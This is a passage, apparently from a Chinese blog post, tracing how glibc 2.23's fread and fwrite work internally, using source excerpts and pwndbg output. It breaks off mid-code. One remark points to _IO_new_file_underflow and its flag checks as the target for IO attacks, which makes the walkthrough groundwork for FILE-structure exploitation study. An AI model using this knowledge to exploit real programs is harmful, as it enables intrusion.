当文件流的缓冲区为空时调用<code>_IO_doallocbuf</code>函数分配新的缓冲区来初始化</p><pre class="line-numbers language-C" data-language="C"><code class="language-C"> if (fp-&gt;_IO_buf_base &#x3D;&#x3D; NULL)   &#123;     &#x2F;* Maybe we already have a push back pointer.  *&#x2F;     if (fp-&gt;_IO_save_base !&#x3D; NULL)&#123;  free (fp-&gt;_IO_save_base);  fp-&gt;_flags &amp;&#x3D; ~_IO_IN_BACKUP;&#125;     _IO_doallocbuf (fp);   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>_IO_doallocbuf</code>函数，函数中再次检查缓冲区是否为空，即是否已初始化</p><pre class="line-numbers language-none"><code class="language-none">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;genops.c   390 libc_hidden_def (_IO_setb)   391    392 void   393 _IO_doallocbuf (_IO_FILE *fp)   394 &#123; ► 395   if (fp-&gt;_IO_buf_base)   396     return;   397   if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0)   398     if (_IO_DOALLOCATE (fp) !&#x3D; EOF)   399       return;   400   _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">void_IO_doallocbuf (_IO_FILE *fp)&#123;  if (fp-&gt;_IO_buf_base)    return;  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0)    if (_IO_DOALLOCATE (fp) !&#x3D; EOF)      return;  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);&#125;libc_hidden_def (_IO_doallocbuf)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if (_IO_DOALLOCATE (fp) != EOF)</code>中调用<code>_IO_doallocbuf</code>分配缓冲区</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">  0x7ffff7a894b7 &lt;_IO_doallocbuf+39&gt;    mov    rax, qword ptr [rbx + 0xd8]  0x7ffff7a894be &lt;_IO_doallocbuf+46&gt;    mov    rdi, rbx► 0x7ffff7a894c1 &lt;_IO_doallocbuf+49&gt;    call   qword ptr [rax + 0x68]        &lt;_IO_file_doallocate&gt;       rdi: 0x405010 ◂— 0xfbad2488       rsi: 0x7fffffffde40 —▸ 0x4011a0 (__libc_csu_init) ◂— endbr64        rdx: 0x14       rcx: 0x405010 ◂— 0xfbad2488<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;filedoalloc.c    90  * optimisation) right after the _fstat() that finds the buffer size.    91  *&#x2F;    92     93 int    94 _IO_file_doallocate (_IO_FILE *fp) ►  95 &#123;    96   _IO_size_t size;    97   char *p;    98   struct stat64 st;    99    100 #ifndef _LIBC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_IO_file_doallocate</code>首先会调用<code>_IO_SYSSTAT</code>，即<code>vtable</code>中的<code> __stat</code>函数，获取文件状态并修改<code>st</code>结构体</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_file_doallocate (_IO_FILE *fp)&#123; ...  if (fp-&gt;_fileno &gt;&#x3D; 0 &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), 0) &gt;&#x3D; 0)    &#123;      if (S_ISCHR (st.st_mode))&#123;  &#x2F;* Possibly a tty.  *&#x2F;  if (#ifdef DEV_TTY_P      DEV_TTY_P (&amp;st) ||#endif      local_isatty (fp-&gt;_fileno))    fp-&gt;_flags |&#x3D; _IO_LINE_BUF;&#125;#if _IO_HAVE_ST_BLKSIZE      if (st.st_blksize &gt; 0)size &#x3D; st.st_blksize;#endif  ...&#125;libc_hidden_def (_IO_file_doallocate)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;fileops.c   1224 &#125;   1225 libc_hidden_def (_IO_file_seek)   1226    1227 int   1228 _IO_file_stat (_IO_FILE *fp, void *st) ► 1229 &#123;   1230   return __fxstat64 (_STAT_VER, fp-&gt;_fileno, (struct stat64 *) st);   1231 &#125;   1232 libc_hidden_def (_IO_file_stat)   1233    1234 int<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成后查看一下<code>st</code>结构体</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p st$3 &#x3D; &#123;  st_dev &#x3D; 2053,  st_ino &#x3D; 1112909,  st_nlink &#x3D; 1,  st_mode &#x3D; 33204,  st_uid &#x3D; 1000,  st_gid &#x3D; 1000,  __pad0 &#x3D; 0,  st_rdev &#x3D; 0,  st_size &#x3D; 399,  st_blksize &#x3D; 4096,  st_blocks &#x3D; 8,  st_atim &#x3D; &#123;    tv_sec &#x3D; 1692447996,    tv_nsec &#x3D; 127240661  &#125;,  st_mtim &#x3D; &#123;    tv_sec &#x3D; 1692447276,    tv_nsec &#x3D; 42244262  &#125;,  st_ctim &#x3D; &#123;    tv_sec &#x3D; 1692447276,    tv_nsec &#x3D; 46248351  &#125;,  __glibc_reserved &#x3D; &#123;0, 0, 0&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>size</code>取了<code>st_blksize</code>的值，接下来用这个大小创建堆来分配缓冲区并调用<code>_IO_setb</code>函数设置<code>_IO_list_all</code>中的<code>_IO_buf_base</code>和<code>_IO_buf_end</code>，至此完成初始化</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_file_doallocate (_IO_FILE *fp)&#123;  ...  p &#x3D; malloc (size);  if (__glibc_unlikely (p &#x3D;&#x3D; NULL))    return EOF;  _IO_setb (fp, p, p + size, 1);  return 1;&#125;libc_hidden_def (_IO_file_doallocate)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all$4 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; -72539000,    _IO_read_ptr &#x3D; 0x0,    _IO_read_end &#x3D; 0x0,    _IO_read_base &#x3D; 0x0,    _IO_write_base &#x3D; 0x0,    _IO_write_ptr &#x3D; 0x0,    _IO_write_end &#x3D; 0x0,    _IO_buf_base &#x3D; 0x405240 &quot;&quot;,    _IO_buf_end &#x3D; 0x406240 &quot;&quot;,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,    _fileno &#x3D; 3,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x4050f0,    _offset &#x3D; -1,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x405100,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; 0,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x230 (with flag bits: 0x231)Allocated chunk | PREV_INUSEAddr: 0x405230Size: 0x1010 (with flag bits: 0x1011)Top chunk | PREV_INUSEAddr: 0x406240Size: 0x1fdc0 (with flag bits: 0x1fdc1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来回到<code>_IO_file_xsgetn</code>函数，拷贝缓冲区中原本存在的数据。其中<code>_IO_read_end</code>指向输入缓冲区结束地址，<code>_IO_read_ptr</code>指向输入缓冲区开始地址，该过程即将开始到结束部分的内容复制到目标缓冲区</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_size_t_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)&#123; ...  while (want &gt; 0)    &#123;      have &#x3D; fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;      if (want &lt;&#x3D; have)&#123;  memcpy (s, fp-&gt;_IO_read_ptr, want);  fp-&gt;_IO_read_ptr +&#x3D; want;  want &#x3D; 0;&#125;      else&#123;  if (have &gt; 0)    &#123;#ifdef _LIBC      s &#x3D; __mempcpy (s, fp-&gt;_IO_read_ptr, have);#else      memcpy (s, fp-&gt;_IO_read_ptr, have);      s +&#x3D; have;#endif      want -&#x3D; have;      fp-&gt;_IO_read_ptr +&#x3D; have;    &#125;  &#x2F;* Check for backup and repeat *&#x2F;  if (_IO_in_backup (fp))    &#123;      _IO_switch_to_main_get_area (fp);      continue;    &#125;...    &#125;  return n - want;&#125;libc_hidden_def (_IO_file_xsgetn)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后在目标缓冲区内容长度小于所需长度时调用<code>__underflow</code>函数真正读取文件</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fp-&gt;_IO_buf_base      &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))    &#123;      if (__underflow (fp) &#x3D;&#x3D; EOF)break;      continue;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行一系列检查之后调用<code>_IO_UNDERFLOW</code>来读取文件，实际调用的是<code>_IO_new_file_underflow</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int__underflow (_IO_FILE *fp)&#123;...  return _IO_UNDERFLOW (fp);&#125;libc_hidden_def (__underflow)    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_IO_new_file_underflow</code>函数中首先检查是否有读权限</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fp-&gt;_flags &amp; _IO_NO_READS)    &#123;      fp-&gt;_flags |&#x3D; _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着判断目标缓冲区是否初始化，若没初始化则调用<code>_IO_doallocbuf</code>初始化</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fp-&gt;_IO_buf_base &#x3D;&#x3D; NULL)    &#123;      &#x2F;* Maybe we already have a push back pointer.  *&#x2F;      if (fp-&gt;_IO_save_base !&#x3D; NULL)&#123;  free (fp-&gt;_IO_save_base);  fp-&gt;_flags &amp;&#x3D; ~_IO_IN_BACKUP;&#125;      _IO_doallocbuf (fp);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化<code>file</code>结构体即<code>fp</code>为<code>_IO_buf_base</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">fp-&gt;_IO_read_base &#x3D; fp-&gt;_IO_read_ptr &#x3D; fp-&gt;_IO_buf_base; fp-&gt;_IO_read_end &#x3D; fp-&gt;_IO_buf_base; fp-&gt;_IO_write_base &#x3D; fp-&gt;_IO_write_ptr &#x3D; fp-&gt;_IO_write_end   &#x3D; fp-&gt;_IO_buf_base;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *fp$8 &#x3D; &#123;  _flags &#x3D; -72539000,  _IO_read_ptr &#x3D; 0x405240 &quot;&quot;,  _IO_read_end &#x3D; 0x405240 &quot;&quot;,  _IO_read_base &#x3D; 0x405240 &quot;&quot;,  _IO_write_base &#x3D; 0x405240 &quot;&quot;,  _IO_write_ptr &#x3D; 0x405240 &quot;&quot;,  _IO_write_end &#x3D; 0x405240 &quot;&quot;,  _IO_buf_base &#x3D; 0x405240 &quot;&quot;,  _IO_buf_end &#x3D; 0x406240 &quot;&quot;,  _IO_save_base &#x3D; 0x0,  _IO_backup_base &#x3D; 0x0,  _IO_save_end &#x3D; 0x0,  _markers &#x3D; 0x0,  _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,  _fileno &#x3D; 3,  _flags2 &#x3D; 0,  _old_offset &#x3D; 0,  _cur_column &#x3D; 0,  _vtable_offset &#x3D; 0 &#39;\000&#39;,  _shortbuf &#x3D; &quot;&quot;,  _lock &#x3D; 0x4050f0,  _offset &#x3D; -1,  _codecvt &#x3D; 0x0,  _wide_data &#x3D; 0x405100,  _freeres_list &#x3D; 0x0,  _freeres_buf &#x3D; 0x0,  __pad5 &#x3D; 0,  _mode &#x3D; -1,  _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 调用<code>_IO_SYSREAD</code>读取文件内容，实际调用的是<code>_IO_file_read</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">count &#x3D; _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;fileops.c   1211 _IO_ssize_t   1212 _IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)   1213 &#123;   1214   return (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, 0)   1215           ? read_not_cancel (fp-&gt;_fileno, buf, size) ► 1216           : read (fp-&gt;_fileno, buf, size));   1217 &#125;   1218 libc_hidden_def (_IO_file_read)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数中调用<code>read</code>函数读取到输入缓冲区中，读入大小为输入缓冲区的大小<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code></p><p>设置缓冲区结束地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">fp-&gt;_IO_read_end +&#x3D; count;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看一下<code>_IO_list_all</code>，可以看到<code>_IO_read_end</code>已经设置为缓冲区结束位置</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all$9 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; -72539000,    _IO_read_ptr &#x3D; 0x405240 &#39;a&#39; &lt;repeats 200 times&gt;...,    _IO_read_end &#x3D; 0x4053cf &quot;&quot;,    _IO_read_base &#x3D; 0x405240 &#39;a&#39; &lt;repeats 200 times&gt;...,    _IO_write_base &#x3D; 0x405240 &#39;a&#39; &lt;repeats 200 times&gt;...,    _IO_write_ptr &#x3D; 0x405240 &#39;a&#39; &lt;repeats 200 times&gt;...,    _IO_write_end &#x3D; 0x405240 &#39;a&#39; &lt;repeats 200 times&gt;...,    _IO_buf_base &#x3D; 0x405240 &#39;a&#39; &lt;repeats 200 times&gt;...,    _IO_buf_end &#x3D; 0x406240 &quot;&quot;,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,    _fileno &#x3D; 3,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x4050f0,    _offset &#x3D; -1,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x405100,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; -1,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来回到<code>_IO_file_xsgetn</code>函数的循环中，再来一次循环将输入缓冲区内容复制给目标缓冲区，<code>fread</code>函数结束</p><p>在此过程中调用的<code>vtable</code>函数</p><ul><li><code>_IO_sgetn</code>函数调用了<code>vtable</code>的<code>_IO_file_xsgetn</code></li><li><code>_IO_doallocbuf</code>函数调用了<code>vtable</code>的<code>_IO_file_doallocate</code>以初始化输入缓冲区</li><li><code>vtable</code>中的<code>_IO_file_doallocate</code>调用了<code>vtable</code>中的<code>__GI__IO_file_stat</code>以获取文件信息</li><li><code>__underflow</code>函数调用了<code>vtable</code>中的<code>_IO_new_file_underflow</code>实现文件数据读取</li><li><code>vtable</code>中的<code>_IO_new_file_underflow</code>调用了<code>vtable</code>中的<code>__GI__IO_file_read</code>最终去执行系统调用<code>read</code></li></ul><p>其他输入函数如<code>scanf</code>、<code>gets</code>等最终实现读取的函数也是<code>_IO_new_file_underflow</code>，因此利用<code>IO</code>攻击读取函数主要是攻击<code>_IO_new_file_underflow</code>，需要注意的是对标志位的判断的绕过</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fp-&gt;_flags &amp; _IO_NO_READS)  &#123;    fp-&gt;_flags |&#x3D; _IO_ERR_SEEN;    __set_errno (EBADF);    return EOF;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;int main()&#123;    char *data&#x3D;malloc(0x1000);    FILE*fp&#x3D;fopen(&quot;test&quot;,&quot;wb&quot;);        fwrite(data,1,0x30,fp);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下<code>vtable</code>里有哪些函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all-&gt;vtable$1 &#x3D; &#123;  __dummy &#x3D; 0,  __dummy2 &#x3D; 0,  __finish &#x3D; 0x7ffff7a878f0 &lt;_IO_new_file_finish&gt;,  __overflow &#x3D; 0x7ffff7a88660 &lt;_IO_new_file_overflow&gt;,  __underflow &#x3D; 0x7ffff7a883d0 &lt;_IO_new_file_underflow&gt;,  __uflow &#x3D; 0x7ffff7a89530 &lt;__GI__IO_default_uflow&gt;,  __pbackfail &#x3D; 0x7ffff7a8a8b0 &lt;__GI__IO_default_pbackfail&gt;,  __xsputn &#x3D; 0x7ffff7a87110 &lt;_IO_new_file_xsputn&gt;,  __xsgetn &#x3D; 0x7ffff7a86df0 &lt;__GI__IO_file_xsgetn&gt;,  __seekoff &#x3D; 0x7ffff7a863f0 &lt;_IO_new_file_seekoff&gt;,  __seekpos &#x3D; 0x7ffff7a89930 &lt;_IO_default_seekpos&gt;,  __setbuf &#x3D; 0x7ffff7a86360 &lt;_IO_new_file_setbuf&gt;,  __sync &#x3D; 0x7ffff7a862a0 &lt;_IO_new_file_sync&gt;,  __doallocate &#x3D; 0x7ffff7a7b130 &lt;__GI__IO_file_doallocate&gt;,  __read &#x3D; 0x7ffff7a870d0 &lt;__GI__IO_file_read&gt;,  __write &#x3D; 0x7ffff7a86aa0 &lt;_IO_new_file_write&gt;,  __seek &#x3D; 0x7ffff7a868a0 &lt;__GI__IO_file_seek&gt;,  __close &#x3D; 0x7ffff7a86270 &lt;__GI__IO_file_close&gt;,  __stat &#x3D; 0x7ffff7a86a90 &lt;__GI__IO_file_stat&gt;,  __showmanyc &#x3D; 0x7ffff7a8aa20 &lt;_IO_default_showmanyc&gt;,  __imbue &#x3D; 0x7ffff7a8aa30 &lt;_IO_default_imbue&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>fwrite</code>函数，实际调用了<code>_IO_fwrite</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofwrite.c   26    27 #include &quot;libioP.h&quot;   28    29 _IO_size_t   30 _IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp) ► 31 &#123;   32   _IO_size_t request &#x3D; size * count;   33   _IO_size_t written &#x3D; 0;   34   CHECK_FILE (fp, 0);   35   if (request &#x3D;&#x3D; 0)   36     return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码如下：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)&#123;  ...  if (_IO_vtable_offset (fp) !&#x3D; 0 || _IO_fwide (fp, -1) &#x3D;&#x3D; -1)    written &#x3D; _IO_sputn (fp, (const char *) buf, request);  ...  if (written &#x3D;&#x3D; request || written &#x3D;&#x3D; EOF)    return count;  else    return written &#x2F; size;&#125;libc_hidden_def (_IO_fwrite)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要就是调用了<code>_IO_sputn</code>函数，跟进之后实际调用的是<code>_IO_new_file_xsputn</code>函数，即<code>vtable</code>中的<code>__xsputn</code></p><p>首先计算输出缓冲区剩余空间， 并将所需输出的数据复制到输出缓冲区</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_size_t_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)&#123;  ...  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      count &#x3D; f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;      ...    &#125;  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)    count &#x3D; f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; &#x2F;* Space available. *&#x2F;  &#x2F;* Then fill the buffer. *&#x2F;  if (count &gt; 0)    &#123;      if (count &gt; to_do)count &#x3D; to_do;#ifdef _LIBC      f-&gt;_IO_write_ptr &#x3D; __mempcpy (f-&gt;_IO_write_ptr, s, count);#else      memcpy (f-&gt;_IO_write_ptr, s, count);      f-&gt;_IO_write_ptr +&#x3D; count;#endif      s +&#x3D; count;      to_do -&#x3D; count;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果没能完全复制过去，那么说明输出缓冲区未建立或已满，调用<code>_IO_OVERFLOW</code>函数来建立或刷新输出缓冲区，刷新<code>_IO_list_all</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;fileops.c   1326     &#125;   1327   if (to_do + must_flush &gt; 0)   1328     &#123;   1329       _IO_size_t block_size, do_write;   1330       &#x2F;* Next flush the (full) buffer. *&#x2F; ► 1331       if (_IO_OVERFLOW (f, EOF) &#x3D;&#x3D; EOF)   1332         &#x2F;* If nothing else has to be written we must not signal the   1333            caller that everything has been written.  *&#x2F;   1334         return to_do &#x3D;&#x3D; 0 ? EOF : n - to_do;   1335    1336       &#x2F;* Try to maintain alignment: write a whole number of blocks.  *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进这个函数，实际调用的函数是<code>_IO_new_file_overflow</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;fileops.c   803    804    805 int   806 _IO_new_file_overflow (_IO_FILE *f, int ch)   807 &#123; ► 808   if (f-&gt;_flags &amp; _IO_NO_WRITES) &#x2F;* SET ERROR *&#x2F;   809     &#123;   810       f-&gt;_flags |&#x3D; _IO_ERR_SEEN;   811       __set_errno (EBADF);   812       return EOF;   813     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数首先判断了是否有可写权限</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (f-&gt;_flags &amp; _IO_NO_WRITES) &#x2F;* SET ERROR *&#x2F;    &#123;      f-&gt;_flags |&#x3D; _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若输出缓冲区未创建则创建输出缓冲区，调用<code>_IO_doallocbuf</code>函数分配输入输出缓冲区并将指针<code>_IO_buf_base</code>和<code>_IO_buf_end</code>赋值，调用<code>_IO_setg</code>宏将输入相关的缓冲区指针赋值为<code>_IO_buf_base</code>指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (f-&gt;_IO_write_base &#x3D;&#x3D; NULL)&#123;  _IO_doallocbuf (f);  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base &#x3D; (eb),\  (fp)-&gt;_IO_read_ptr &#x3D; (g), (fp)-&gt;_IO_read_end &#x3D; (eg))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接着将<code>f-&gt;_IO_write_base</code>、<code>f-&gt;_IO_write_ptr</code>设置成<code>f-&gt;_IO_read_ptr</code>指针；将<code>f-&gt;_IO_write_end</code>赋值为<code>f-&gt;_IO_buf_end</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">   if (__glibc_unlikely (_IO_in_backup (f)))&#123;  size_t nbackup &#x3D; f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;  _IO_free_backup_area (f);  f-&gt;_IO_read_base -&#x3D; MIN (nbackup,   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);  f-&gt;_IO_read_ptr &#x3D; f-&gt;_IO_read_base;&#125;     if (f-&gt;_IO_read_ptr &#x3D;&#x3D; f-&gt;_IO_buf_end)f-&gt;_IO_read_end &#x3D; f-&gt;_IO_read_ptr &#x3D; f-&gt;_IO_buf_base;     f-&gt;_IO_write_ptr &#x3D; f-&gt;_IO_read_ptr;     